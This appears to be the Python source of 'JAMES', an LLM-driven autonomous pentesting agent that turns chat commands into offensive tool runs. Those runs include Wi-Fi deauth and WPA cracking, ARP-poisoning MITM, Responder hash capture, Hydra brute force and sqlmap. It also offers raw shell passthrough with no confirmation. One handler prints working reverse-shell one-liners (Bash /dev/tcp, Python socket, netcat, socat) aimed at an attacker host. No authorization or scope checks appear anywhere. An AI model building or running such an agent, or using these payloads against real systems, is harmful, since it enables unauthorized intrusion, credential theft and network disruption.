"""
JAMES Agent Brain.

Rule-based command interpreter that understands pentesting intent,
plans multi-step actions, and drives the orchestrator. Acts as the
"AI" layer between user natural-language input and tool execution.
"""

import os
import re
import json
import shlex
from dataclasses import dataclass, field
from typing import Optional

try:
    from google import genai
    from google.genai import types
    HAS_GENAI = True
except ImportError:
    HAS_GENAI = False

from james.core.orchestrator import Orchestrator


@dataclass
class AgentAction:
    """A single planned action the agent will execute."""
    description: str
    method: str          # orchestrator method name
    args: dict = field(default_factory=dict)
    requires_confirm: bool = False


@dataclass
class AgentPlan:
    """Multi-step plan the agent generates from user input."""
    intent: str
    summary: str
    actions: list[AgentAction] = field(default_factory=list)


# ── intent patterns ─────────────────────────────────────────────

INTENT_PATTERNS = [
    # Recon / scanning (specific before generic)
    (r"(?:masscan|mass\s*scan)\s+(.+)", "masscan"),
    (r"(?:quick\s*scan|fast\s*scan)\s+(.+)", "quick_recon"),
    (r"(?:full\s*scan|deep\s*scan|thorough\s*scan)\s+(.+)", "full_scan"),
    (r"(?:os\s*detect|fingerprint)\s+(.+)", "os_detect"),
    (r"(?:port\s*scan)\s+(.+)", "recon"),
    (r"(?:ssl|tls)\s+(?:scan|check|audit)\s+(.+)", "ssl_scan"),
    (r"(?:web\s*scan|nikto)\s+(.+)", "web_scan"),
    (r"(?:waf|firewall)\s+(?:detect|check|scan)\s+(.+)", "waf_detect"),
    (r"(?:scan|recon|enumerate|discover)\s+(.+)", "recon"),

    # Wi-Fi
    (r"(?:list|show)\s+(?:interfaces?|wifi|wlan|wireless)", "list_interfaces"),
    (r"(?:enable|start|turn\s*on)\s+monitor(?:\s+(?:mode\s+)?(?:on\s+)?(\S+))?", "monitor_on"),
    (r"(?:disable|stop|turn\s*off)\s+monitor(?:\s+(?:mode\s+)?(?:on\s+)?(\S+))?", "monitor_off"),
    (r"deauth(?:enticate)?\s+(\S+)(?:\s+(\d+))?", "deauth"),
    (r"(?:capture|sniff)\s+(?:handshake|packets?)\s+(?:on\s+)?(\S+)", "capture"),
    (r"(?:auto\s*pwn|autopwn|auto\s*hack|auto\s*crack)(?:\s+(\S+))?", "autopwn"),

    # OSINT
    (r"(?:osint|harvest|recon\s*domain|domain\s*recon)\s+(\S+)", "osint"),
    (r"(?:whois)\s+(\S+)", "whois"),
    (r"(?:dns\s*enum|dns\s*recon|dig)\s+(\S+)", "dns_enum"),

    # Web (extras not already handled above)
    (r"(?:gobuster|dir\s*brute|dir\s*bust)\s+(\S+)", "dir_brute"),
    (r"(?:sqlmap|sql\s*inject(?:ion)?)\s+(\S+)", "sqli"),

    # Network attacks
    (r"(?:arp\s*spoof|arp\s*poison|mitm)\s+(\S+)(?:\s+(\S+))?", "mitm"),
    (r"(?:responder|llmnr|nbt\s*poison)(?:\s+(\S+))?", "responder"),
    (r"(?:sniff|capture\s*packets?|tcpdump|tshark)(?:\s+(\S+))?", "sniff"),

    # Exploit
    (r"(?:reverse\s*shell|rev\s*shell|listener)(?:\s+(\d+))?", "reverse_shell"),
    (r"(?:msf|metasploit|msfconsole)(?:\s+(.+))?", "msf"),

    # Cracking
    (r"crack\s+(?:wpa|handshake|cap)\s+(\S+)(?:\s+(?:with|using)\s+(\S+))?", "crack_wpa"),
    (r"crack\s+(?:hash(?:es)?)\s+(\S+)(?:\s+(?:with|using)\s+(\S+))?", "crack_hash"),

    # Brute force
    (r"(?:brute\s*force|hydra|brute)\s+(\S+)(?:\s+(\S+))?", "brute"),

    # System
    (r"(?:system\s*check|check\s*tools?|status)", "system_check"),
    (r"(?:list|show)\s+skills?", "list_skills"),
    (r"(?:run|execute|load)\s+skill\s+(\S+)", "run_skill"),
    (r"set\s+(\w+)\s+(.+)", "set_context"),
    (r"(?:help|commands?|what\s+can)", "help"),
    (r"(?:history|log|task\s*log)", "show_log"),
    (r"(?:report|generate\s*report|export\s*report)", "report"),
    (r"(?:clear|reset)", "clear"),

    # Direct command passthrough
    (r"^!\s*(.+)", "shell"),
    (r"^(?:run|exec(?:ute)?)\s+(.+)", "shell"),
]


class Agent:
    """
    Conversational pentesting agent.

    Parses natural-language input, generates execution plans,
    and drives the Orchestrator to carry them out.
    """

    def __init__(self, orchestrator: Orchestrator):
        self.orch = orchestrator
        self.context: dict = {}   # tracks session state (target, iface, etc.)
        self.history: list[dict] = []
        self.genai_client = None
        
        if HAS_GENAI and os.environ.get("GEMINI_API_KEY"):
            self.genai_client = genai.Client()

    def process(self, user_input: str) -> str:
        """
        Main entry point. Takes user text, returns agent response.
        May execute tools as a side effect.
        """
        text = user_input.strip()
        if not text:
            return ""

        self.history.append({"role": "user", "content": text})

        # Try LLM first
        if self.genai_client:
            resp = self._process_with_llm(text)
            if resp is not None:
                self.history.append({"role": "agent", "content": resp})
                return resp

        # Fallback to Regex
        intent, match = self._match_intent(text)
        if intent is None:
            resp = self._fallback(text)
        else:
            resp = self._dispatch(intent, match, text)

        self.history.append({"role": "agent", "content": resp})
        return resp

    def _process_with_llm(self, text: str) -> Optional[str]:
        try:
            system_prompt = """You are JAMES, an autonomous pentesting agent running on Parrot OS.
You control various pentesting tools. Map the user's natural language to the correct JSON action.
Available Actions:
- {"action": "quick_recon", "target": "<IP/Domain>"} -> Fast nmap scan
- {"action": "full_scan", "target": "<IP/Domain>"} -> Deep nmap scan
- {"action": "os_detect", "target": "<IP>"} -> OS fingerprinting
- {"action": "list_interfaces"} -> List Wi-Fi interfaces
- {"action": "monitor_on", "iface": "<interface>"} -> Start monitor mode
- {"action": "monitor_off", "iface": "<interface>"} -> Stop monitor mode
- {"action": "deauth", "bssid": "<mac>", "count": <int>} -> Send deauth frames
- {"action": "crack_wpa", "file": "<capture_file>", "wordlist": "<path>"} -> Crack WPA
- {"action": "crack_hash", "file": "<hash_file>", "wordlist": "<path>"} -> Crack hash
- {"action": "autopwn", "iface": "<interface>"} -> Fully autonomous Wi-Fi audit (recon, target, deauth, capture, crack)
- {"action": "run_skill", "name": "<skill_name>"} -> Run automated skill workflow (e.g., wifi_audit, full_recon, smb_audit, web_recon)
- {"action": "set_context", "key": "<key>", "value": "<value>"} -> Set context variable
- {"action": "chat", "message": "<text>"} -> Respond conversationally if no tool is needed

Respond ONLY with valid JSON. Do not include markdown formatting or extra text.
"""
            # Build conversation history for LLM context
            contents = ""
            for msg in self.history[-10:]:
                role = "User" if msg["role"] == "user" else "Agent"
                contents += f"{role}: {msg['content']}\\n"
            
            response = self.genai_client.models.generate_content(
                model='gemini-2.5-pro',
                contents=contents,
                config=types.GenerateContentConfig(
                    system_instruction=system_prompt,
                    temperature=0.0,
                    response_mime_type="application/json",
                )
            )
            
            data = json.loads(response.text)
            action = data.get("action")
            
            if action == "chat":
                return data.get("message", "...")
            elif action == "quick_recon":
                target = data.get("target")
                self.context["target"] = target
                return self._format_scan(self.orch.quick_recon(target), target, "Quick")
            elif action == "full_scan":
                target = data.get("target")
                self.context["target"] = target
                return self._format_scan(self.orch.full_scan(target), target, "Full")
            elif action == "os_detect":
                class MockMatch:
                    def group(self, i): return data.get("target")
                return self._do_os_detect(MockMatch(), None)
            elif action == "list_interfaces":
                return self._do_list_interfaces(None, None)
            elif action == "monitor_on":
                class MockMatch:
                    def group(self, i): return data.get("iface")
                return self._do_monitor_on(MockMatch(), None)
            elif action == "monitor_off":
                class MockMatch:
                    def group(self, i): return data.get("iface")
                return self._do_monitor_off(MockMatch(), None)
            elif action == "deauth":
                class MockMatch:
                    def group(self, i): 
                        if i==1: return data.get("bssid")
                        if i==2: return str(data.get("count", 10))
                        return None
                return self._do_deauth(MockMatch(), None)
            elif action == "crack_wpa":
                class MockMatch:
                    def group(self, i): 
                        if i==1: return data.get("file")
                        if i==2: return data.get("wordlist")
                        return None
                return self._do_crack_wpa(MockMatch(), None)
            elif action == "crack_hash":
                class MockMatch:
                    def group(self, i): 
                        if i==1: return data.get("file")
                        if i==2: return data.get("wordlist")
                        return None
                return self._do_crack_hash(MockMatch(), None)
            elif action == "run_skill":
                class MockMatch:
                    def group(self, i): return data.get("name")
                return self._do_run_skill(MockMatch(), None)
            elif action == "set_context":
                key = data.get("key")
                val = data.get("value")
                self.context[key] = val
                return f"✅ Context updated (via AI): {key} = {val}"
            else:
                return None  # Let regex handle unknown actions
        except Exception as e:
            import logging
            logging.error(f"LLM Error: {e}")
            return None

    # ── intent matching ─────────────────────────────────────────

    def _match_intent(self, text: str):
        lower = text.lower().strip()
        for pattern, intent in INTENT_PATTERNS:
            m = re.search(pattern, lower)
            if m:
                return intent, m
        return None, None

    # ── dispatch ────────────────────────────────────────────────

    def _dispatch(self, intent: str, match, raw: str) -> str:
        try:
            handler = getattr(self, f"_do_{intent}", None)
            if handler:
                return handler(match, raw)
            return f"[!] Intent '{intent}' recognized but no handler yet."
        except Exception as e:
            return f"[ERROR] {e}"

    # ── handlers ────────────────────────────────────────────────

    def _do_help(self, m, raw) -> str:
        skill_count = len(self.orch.list_skills())
        return f"""⚡ JAMES — Command Reference ({skill_count} skills loaded)

  🔍 Recon & Scanning
    scan <target>          Quick nmap scan
    full scan <target>     Deep service + script scan
    masscan <target>       Ultra-fast full port scan (65535 ports)
    os detect <target>     OS fingerprinting (needs root)

  📡 Wi-Fi
    list interfaces        Show wireless adapters
    enable monitor [iface] Start monitor mode
    disable monitor [iface] Stop monitor mode
    deauth <BSSID> [count] Send deauth frames
    autopwn [interface]    Full autonomous Wi-Fi crack

  🌐 Web & OSINT
    osint <domain>         Harvest emails, subdomains, IPs
    whois <domain>         Domain registration lookup
    dns enum <domain>      DNS record enumeration
    waf detect <url>       Detect web application firewall
    ssl scan <target>      SSL/TLS security audit
    nikto <url>            Web vulnerability scan
    gobuster <url>         Directory brute-force
    sqlmap <url>           SQL injection testing

  🕸️ Network Attacks
    mitm <victim> [gw]     ARP poisoning MITM
    responder [interface]  LLMNR/NBT-NS hash capture
    sniff [interface]      Packet capture & analysis
    brute <target> [proto] Hydra brute-force

  💣 Exploit
    reverse shell [port]   Generate payloads + start listener
    msf [search term]      Metasploit search/exploit

  🔓 Cracking
    crack wpa <file>       Crack WPA handshake
    crack hash <file>      Crack hash file (hashcat)

  ⚙️ System
    status                 Check all {skill_count}+ tools
    list skills            Show {skill_count} skill workflows
    run skill <name>       Execute a skill workflow
    report                 Generate session report
    history                Show task log
    set <key> <value>      Set context variable
    clear                  Reset session context

  💻 Shell
    ! <command>            Run a raw shell command

  💡 Context: I remember target, interface, wordlist, etc."""

    def _do_system_check(self, m, raw) -> str:
        status = self.orch.system_check()
        installed = sum(1 for v in status.values() if v)
        total = len(status)
        lines = [f"⚙️ System Tool Status ({installed}/{total} installed):\n"]

        categories = {
            "Scanning": ["nmap", "masscan"],
            "Wi-Fi": ["aircrack-ng", "airmon-ng", "airodump-ng", "aireplay-ng", "iwconfig",
                       "reaver", "bully", "mdk4", "wifite", "hcxdumptool"],
            "Cracking": ["hashcat", "john"],
            "Brute-Force": ["hydra", "medusa", "ncrack"],
            "Web": ["sqlmap", "nikto", "gobuster", "whatweb", "wafw00f", "sslscan"],
            "OSINT": ["theHarvester"],
            "Network": ["responder", "ettercap", "tcpdump", "tshark", "netcat", "socat",
                        "arp-scan", "netdiscover"],
            "SMB/AD": ["enum4linux", "smbclient"],
            "Exploit": ["msfconsole"],
        }

        for cat, tools in categories.items():
            cat_status = [(t, status.get(t, False)) for t in tools]
            cat_ok = sum(1 for _, ok in cat_status if ok)
            lines.append(f"\n  [{cat}] ({cat_ok}/{len(tools)})")
            for tool, ok in cat_status:
                icon = "✅" if ok else "❌"
                lines.append(f"    {icon}  {tool}")

        return "\n".join(lines)

    def _do_recon(self, m, raw) -> str:
        return self._do_quick_recon(m, raw)

    def _do_quick_recon(self, m, raw) -> str:
        target = m.group(1).strip()
        self.context["target"] = target
        result = self.orch.quick_recon(target)
        return self._format_scan(result, target, "Quick")

    def _do_full_scan(self, m, raw) -> str:
        target = m.group(1).strip()
        self.context["target"] = target
        result = self.orch.full_scan(target)
        return self._format_scan(result, target, "Full")

    def _do_os_detect(self, m, raw) -> str:
        target = m.group(1).strip()
        self.context["target"] = target
        result = self.orch.nmap.os_detect(target)
        if "error" in result:
            return f"[!] OS detection failed: {result['error']}"
        lines = [f"🖥️ OS Detection — {target}\n"]
        for host in result.get("hosts", []):
            lines.append(f"  Host: {host['address']}")
            for os_m in host.get("os_matches", []):
                lines.append(f"    → {os_m['name']} ({os_m['accuracy']}% match)")
        return "\n".join(lines) if len(lines) > 1 else "No OS matches found."

    def _do_list_interfaces(self, m, raw) -> str:
        ifaces = self.orch.wifi_interfaces()
        if not ifaces:
            return "📡 No wireless interfaces found."
        lines = ["📡 Wireless Interfaces:\n"]
        for i, iface in enumerate(ifaces):
            mode = iface.get("mode", "unknown")
            icon = "🟢" if mode == "Monitor" else "⚪"
            lines.append(f"  {icon}  {iface['interface']}  [{mode}]")
            if i == 0:
                self.context["interface"] = iface["interface"]
        return "\n".join(lines)

    def _do_monitor_on(self, m, raw) -> str:
        iface = m.group(1) or self.context.get("interface")
        if not iface:
            return "[!] No interface specified. Use: enable monitor <interface>"
        self.context["interface"] = iface
        result = self.orch.start_monitor(iface)
        if result.get("success", False):
            mon_iface = f"{iface}mon" if not iface.endswith("mon") else iface
            self.context["monitor_interface"] = mon_iface
            return f"📡 Monitor mode enabled on {iface}\n    Monitor interface: {mon_iface}"
        return f"[!] Failed to enable monitor mode:\n{result.get('stderr', '')}"

    def _do_monitor_off(self, m, raw) -> str:
        iface = m.group(1) or self.context.get("monitor_interface") or self.context.get("interface")
        if not iface:
            return "[!] No interface specified."
        result = self.orch.stop_monitor(iface)
        self.context.pop("monitor_interface", None)
        return f"📡 Monitor mode disabled on {iface}"

    def _do_deauth(self, m, raw) -> str:
        bssid = m.group(1)
        count = int(m.group(2)) if m.group(2) else 10
        iface = self.context.get("monitor_interface") or self.context.get("interface")
        if not iface:
            return "[!] No monitor interface active. Enable monitor mode first."
        self.context["target_bssid"] = bssid
        result = self.orch.aircrack.deauth(iface, bssid, count=count)
        return f"💀 Sent {count} deauth frames → {bssid} via {iface}\n{result.stdout[:500]}"

    def _do_crack_wpa(self, m, raw) -> str:
        cap_file = m.group(1)
        wordlist = m.group(2) if m.group(2) else "/home/malcolm/Desktop/rockyou.txt"
        bssid = self.context.get("target_bssid")
        result = self.orch.crack_handshake(cap_file, wordlist, bssid)
        if result.get("found"):
            return f"🔑 KEY FOUND!\n\n    Password: {result['key']}\n    Capture:  {cap_file}"
        return f"🔒 No key found in {cap_file} with the provided wordlist."

    def _do_crack_hash(self, m, raw) -> str:
        hash_file = m.group(1)
        wordlist = m.group(2) if m.group(2) else "/home/malcolm/Desktop/rockyou.txt"
        result = self.orch.crack_hash(hash_file, wordlist)
        if result.get("success"):
            return f"🔓 Hashcat finished:\n{result['output'][-800:]}"
        return f"[!] Hashcat error:\n{result.get('stderr', '')[:500]}"

    def _do_list_skills(self, m, raw) -> str:
        skills = self.orch.list_skills()
        if not skills:
            return "No skills found."
        lines = ["📋 Available Skills:\n"]
        for s in skills:
            data = self.orch.load_skill(s)
            desc = data.get("description", "")
            lines.append(f"  ⚡ {s} — {desc}")
        return "\n".join(lines)

    def _do_set_context(self, m, raw) -> str:
        key = m.group(1).strip()
        val = m.group(2).strip()
        self.context[key] = val
        return f"✅ Context updated: {key} = {val}"

    def _do_run_skill(self, m, raw) -> str:
        name = m.group(1).strip()
        skill = self.orch.load_skill(name)
        if "error" in skill:
            return f"[!] {skill['error']}"
        
        # Check for required parameters
        missing = []
        for step in skill.get("steps", []):
            for param_key, param_val in step.get("params", {}).items():
                if isinstance(param_val, str) and param_val.startswith("{{") and param_val.endswith("}}"):
                    var_name = param_val[2:-2].strip()
                    if var_name not in self.context:
                        missing.append(var_name)
        
        if missing:
            missing = list(set(missing))
            return (f"⚠️ Cannot start skill '{name}' because parameters are missing from context:\n"
                    f"  {', '.join(missing)}\n\n"
                    f"Please set them using: set <variable> <value>")
        
        # Launch the workflow in a separate thread so we don't block the agent
        import threading
        t = threading.Thread(target=self._execute_skill_steps, args=(skill,), daemon=True)
        t.start()
        
        return f"⚡ Starting automated skill: {skill['name']}\n\nSwitch to the ⚡ Dashboard tab to monitor progress in the terminal."

    def _do_autopwn(self, m, raw) -> str:
        iface = m.group(1) if m.group(1) else self.context.get("interface")
        if not iface:
            return "[!] No interface specified. Use: autopwn <interface>\n    Or set one first: set interface wlan0"
        wordlist = self.context.get("wordlist", "/home/malcolm/Desktop/rockyou.txt")
        self.context["interface"] = iface

        import threading
        t = threading.Thread(
            target=self.orch.auto_wifi_pwn,
            args=(iface, wordlist),
            daemon=True
        )
        t.start()

        return (f"🔥 AutoPwn launched on {iface}\n"
                f"   Wordlist: {wordlist}\n\n"
                f"   The workflow is running in the background.\n"
                f"   Switch to the ⚡ Dashboard tab to watch progress in real-time.\n\n"
                f"   💡 To change the wordlist: set wordlist /path/to/wordlist.txt")

    def _execute_skill_steps(self, skill: dict):
        self.orch.execute_skill_steps(skill, self.context)

    def _do_show_log(self, m, raw) -> str:
        log = self.orch.export_log()
        if not log:
            return "📋 No tasks in log yet."
        lines = [f"📋 Task Log ({len(log)} entries):\n"]
        for entry in log[-15:]:  # last 15
            icon = "✅" if entry["status"] == "done" else "❌"
            lines.append(f"  {icon} [{entry['timestamp'][:19]}] {entry['action']} ({entry['tool']})")
        return "\n".join(lines)

    def _do_shell(self, m, raw) -> str:
        cmd = m.group(1).strip()
        result = self.orch.layer.run(cmd, timeout=60)
        output = (result.stdout + result.stderr).strip()
        if len(output) > 3000:
            output = output[:3000] + "\n... (truncated)"
        return f"$ {cmd}\n{output}" if output else f"$ {cmd}\n(no output)"

    # ── new handlers ────────────────────────────────────────────

    def _do_masscan(self, m, raw) -> str:
        target = m.group(1).strip()
        self.context["target"] = target
        result = self.orch.masscan.scan(target, rate=1000)
        if "error" in result:
            return f"[!] Masscan failed: {result['error']}"
        count = result.get("count", 0)
        lines = [f"⚡ Masscan — {target} ({count} open ports)\n"]
        for h in result.get("hosts", [])[:50]:
            lines.append(f"  {h['ip']}:{h['port']}/{h['proto']}  {h['status']}")
        if count > 50:
            lines.append(f"\n  ... and {count - 50} more")
        return "\n".join(lines)

    def _do_osint(self, m, raw) -> str:
        domain = m.group(1).strip()
        self.context["domain"] = domain
        self.context["target"] = domain
        result = self.orch.harvester.harvest(domain)
        lines = [f"🔎 OSINT — {domain}\n"]
        lines.append(f"  📧 Emails found: {result['email_count']}")
        for e in result.get("emails", [])[:15]:
            lines.append(f"    • {e}")
        lines.append(f"\n  🌐 Subdomains found: {result['subdomain_count']}")
        for s in result.get("subdomains", [])[:15]:
            lines.append(f"    • {s}")
        if result.get("ips"):
            lines.append(f"\n  🔢 IPs found: {len(result['ips'])}")
            for ip in result["ips"][:10]:
                lines.append(f"    • {ip}")
        return "\n".join(lines)

    def _do_whois(self, m, raw) -> str:
        domain = m.group(1).strip()
        result = self.orch.layer.run(f"whois {domain} | head -40", timeout=15)
        return f"📋 WHOIS — {domain}\n\n{result.stdout[:2000]}"

    def _do_dns_enum(self, m, raw) -> str:
        domain = m.group(1).strip()
        cmd = f"dig {domain} ANY +noall +answer && dig {domain} MX +noall +answer && dig {domain} NS +noall +answer"
        result = self.orch.layer.run(cmd, timeout=15)
        return f"🔍 DNS — {domain}\n\n{result.stdout[:2000]}"

    def _do_waf_detect(self, m, raw) -> str:
        url = m.group(1).strip()
        result = self.orch.wafdetect.detect(url)
        if result["waf_detected"]:
            return f"🛡️ WAF Detected on {url}\n\n  Vendor: {result['waf_name']}"
        return f"✅ No WAF detected on {url}"

    def _do_ssl_scan(self, m, raw) -> str:
        target = m.group(1).strip()
        result = self.orch.sslscan.scan(target)
        lines = [f"🔐 SSL/TLS Scan — {target}\n"]
        lines.append(f"  Ciphers found: {result['ciphers_found']}")
        if result.get("vulnerabilities"):
            lines.append(f"\n  ⚠️ Vulnerabilities:")
            for v in result["vulnerabilities"]:
                lines.append(f"    ✕ {v}")
        else:
            lines.append("  ✅ No critical vulnerabilities found")
        return "\n".join(lines)

    def _do_web_scan(self, m, raw) -> str:
        url = m.group(1).strip()
        self.context["target_url"] = url
        result = self.orch.layer.run(f"nikto -h {url} -maxtime 120s", timeout=130)
        output = result.stdout[-2000:]
        return f"🌐 Nikto Scan — {url}\n\n{output}"

    def _do_dir_brute(self, m, raw) -> str:
        url = m.group(1).strip()
        self.context["target_url"] = url
        result = self.orch.layer.run(
            f"gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -t 20 --no-error -q",
            timeout=180
        )
        return f"📂 Directory Scan — {url}\n\n{result.stdout[:2500]}"

    def _do_sqli(self, m, raw) -> str:
        url = m.group(1).strip()
        self.context["target_url"] = url
        result = self.orch.layer.run(
            f"sqlmap -u '{url}' --batch --crawl=2 --level=2 --risk=1 --threads=5",
            timeout=300
        )
        return f"💉 SQLMap — {url}\n\n{result.stdout[-2500:]}"

    def _do_mitm(self, m, raw) -> str:
        victim = m.group(1).strip()
        gateway = m.group(2).strip() if m.group(2) else self.context.get("gateway")
        iface = self.context.get("interface")
        if not gateway:
            return "[!] Need gateway. Use: mitm <victim> <gateway>\n    Or: set gateway 192.168.1.1"
        if not iface:
            return "[!] No interface set. Use: set interface eth0"
        self.context["victim"] = victim
        self.context["gateway"] = gateway

        import threading
        t = threading.Thread(
            target=self.orch.ettercap.arp_poison,
            args=(iface, victim, gateway),
            kwargs={"timeout": 60},
            daemon=True
        )
        t.start()
        return (f"🕸️ MITM Attack Started\n"
                f"  Victim:  {victim}\n"
                f"  Gateway: {gateway}\n"
                f"  Via:     {iface}\n\n"
                f"  ARP poisoning active for 60s. Check Dashboard for output.")

    def _do_responder(self, m, raw) -> str:
        iface = m.group(1) if m.group(1) else self.context.get("interface")
        if not iface:
            return "[!] No interface specified. Use: responder <interface>"

        import threading
        t = threading.Thread(
            target=self.orch.responder.start,
            args=(iface,),
            kwargs={"timeout": 60},
            daemon=True
        )
        t.start()
        return (f"🎣 Responder launched on {iface}\n"
                f"  Poisoning LLMNR/NBT-NS/MDNS for 60s\n"
                f"  Captured hashes will appear in Dashboard terminal.")

    def _do_sniff(self, m, raw) -> str:
        iface = m.group(1) if m.group(1) else self.context.get("interface")
        if not iface:
            return "[!] No interface specified. Use: sniff <interface>"
        result = self.orch.layer.run(f"timeout 15 tcpdump -i {iface} -c 100 -nn 2>/dev/null", sudo=True, timeout=20)
        return f"📡 Packet Capture — {iface} (100 packets)\n\n{result.stdout[:2500]}"

    def _do_brute(self, m, raw) -> str:
        target = m.group(1).strip()
        proto = m.group(2).strip() if m.group(2) else "ssh"
        username = self.context.get("username", "admin")
        wordlist = self.context.get("wordlist", "/home/malcolm/Desktop/rockyou.txt")
        self.context["target"] = target
        result = self.orch.layer.run(
            f"hydra -l {username} -P {wordlist} {target} {proto} -t 4 -f",
            timeout=300
        )
        if "login:" in result.stdout:
            return f"🔑 Hydra FOUND credentials!\n\n{result.stdout[-1000:]}"
        return f"🔒 Hydra — no credentials found for {username}@{target} ({proto})\n\n{result.stdout[-500:]}"

    def _do_reverse_shell(self, m, raw) -> str:
        port = m.group(1) if m.group(1) else "4444"
        lhost = self.context.get("lhost", "0.0.0.0")
        self.context["lport"] = port
        return (f"🐚 Reverse Shell Payloads (LHOST={lhost} LPORT={port})\n\n"
                f"  [Bash]\n"
                f"    bash -i >& /dev/tcp/{lhost}/{port} 0>&1\n\n"
                f"  [Python]\n"
                f"    python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n\n"
                f"  [Netcat]\n"
                f"    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {port} >/tmp/f\n\n"
                f"  [Socat]\n"
                f"    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{port}\n\n"
                f"  💡 Start listener: ! nc -nlvp {port}\n"
                f"  💡 Set your IP: set lhost <your-ip>")

    def _do_msf(self, m, raw) -> str:
        query = m.group(1) if m.group(1) else ""
        if query:
            result = self.orch.layer.run(f"msfconsole -q -x 'search {query}; exit'", timeout=45)
            return f"🔫 Metasploit Search: {query}\n\n{result.stdout[-2500:]}"
        return ("🔫 Metasploit usage:\n"
                "  msf <search term>    Search for exploits\n"
                "  ! msfconsole         Launch interactive console\n"
                "  run skill msf_exploit Run automated MSF skill")

    def _do_report(self, m, raw) -> str:
        log = self.orch.export_log()
        if not log:
            return "📋 No tasks to report."

        from datetime import datetime
        report = [f"# JAMES Penetration Test Report",
                  f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n",
                  f"## Session Context"]
        for k, v in self.context.items():
            report.append(f"- **{k}**: {v}")

        report.append(f"\n## Task Log ({len(log)} entries)\n")
        report.append("| Time | Action | Tool | Status |")
        report.append("|------|--------|------|--------|")
        for e in log:
            report.append(f"| {e['timestamp'][:19]} | {e['action']} | {e['tool']} | {e['status']} |")

        skills = self.orch.list_skills()
        report.append(f"\n## Available Skills: {len(skills)}")
        report.append(f"\n## Tools Status")
        status = self.orch.system_check()
        installed = sum(1 for v in status.values() if v)
        report.append(f"- {installed}/{len(status)} tools installed")

        report_text = "\n".join(report)
        report_path = "/tmp/james_report.md"
        with open(report_path, "w") as f:
            f.write(report_text)

        return (f"📋 Report generated ({len(log)} tasks logged)\n"
                f"   Saved to: {report_path}\n\n"
                f"   Context: {len(self.context)} variables set\n"
                f"   Tools: {installed}/{len(status)} installed\n"
                f"   Skills: {len(skills)} available")

    def _do_clear(self, m, raw) -> str:
        self.context.clear()
        self.history.clear()
        return "🔄 Session context and history cleared."

    def _do_capture(self, m, raw) -> str:
        iface = m.group(1) if m.group(1) else self.context.get("monitor_interface")
        if not iface:
            return "[!] No interface specified."
        result = self.orch.layer.run(
            f"timeout 30 airodump-ng {iface} --output-format csv -w /tmp/james_capture",
            sudo=True, timeout=35
        )
        return f"📡 Capture on {iface} complete.\n  Output: /tmp/james_capture-01.csv"

    # ── helpers ─────────────────────────────────────────────────

    def _format_scan(self, result: dict, target: str, scan_type: str) -> str:
        if "error" in result:
            return f"[!] Scan failed: {result['error']}"
        hosts = result.get("hosts", [])
        if not hosts:
            return f"🔍 {scan_type} scan of {target} — no hosts found."

        lines = [f"🔍 {scan_type} Scan Results — {target}\n"]
        for host in hosts:
            lines.append(f"  🖥️  {host['address']} ({host['state']})")
            ports = host.get("ports", [])
            if ports:
                for p in ports:
                    svc = p.get("service", "")
                    ver = p.get("version", "")
                    extra = f" ({ver})" if ver else ""
                    lines.append(f"      {p['port']}/{p['protocol']}  {p['state']:8s}  {svc}{extra}")
            else:
                lines.append("      (no open ports)")

        total_ports = sum(len(h.get("ports", [])) for h in hosts)
        lines.append(f"\n  Summary: {len(hosts)} host(s), {total_ports} open port(s)")

        # auto-suggest next steps
        lines.append(self._suggest_next(hosts))
        return "\n".join(lines)

    def _suggest_next(self, hosts: list) -> str:
        suggestions = ["\n  💡 Suggested next steps:"]
        all_services = set()
        all_ports = set()
        for h in hosts:
            for p in h.get("ports", []):
                all_services.add(p.get("service", ""))
                all_ports.add(str(p.get("port", "")))

        if "ssh" in all_services:
            suggestions.append("    → run skill brute_ssh       (SSH brute-force)")
        if "http" in all_services or "https" in all_services or "80" in all_ports or "443" in all_ports:
            suggestions.append("    → run skill full_web_audit   (nikto + gobuster + sqlmap)")
            suggestions.append("    → waf detect <url>           (check for WAF)")
        if "smb" in all_services or "microsoft-ds" in all_services or "445" in all_ports:
            suggestions.append("    → run skill ad_domain_recon  (AD enumeration)")
        if "ftp" in all_services or "21" in all_ports:
            suggestions.append("    → run skill brute_ftp        (FTP brute-force)")
        if "443" in all_ports:
            suggestions.append("    → ssl scan <target>          (TLS audit)")
        if "3306" in all_ports or "5432" in all_ports:
            suggestions.append("    → run skill brute_multi      (multi-protocol brute)")
        if len(suggestions) == 1:
            suggestions.append("    → full scan <target>         (deeper enumeration)")
            suggestions.append("    → run skill vuln_scan        (vulnerability scan)")
        return "\n".join(suggestions)

    def _fallback(self, text: str) -> str:
        # Check if it looks like a target/IP
        if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", text):
            self.context["target"] = text
            return f"🎯 Target set: {text}\n    Try: scan {text}"

        # Check if it looks like a domain
        if re.match(r"^[a-z0-9-]+\.[a-z]{2,}", text, re.I):
            self.context["domain"] = text
            self.context["target"] = text
            return f"🎯 Domain set: {text}\n    Try: osint {text}  or  scan {text}"

        return (
            f"🤔 I didn't understand: \"{text}\"\n\n"
            "    Type 'help' to see available commands.\n"
            "    Or use '! <command>' to run a shell command directly."
        )

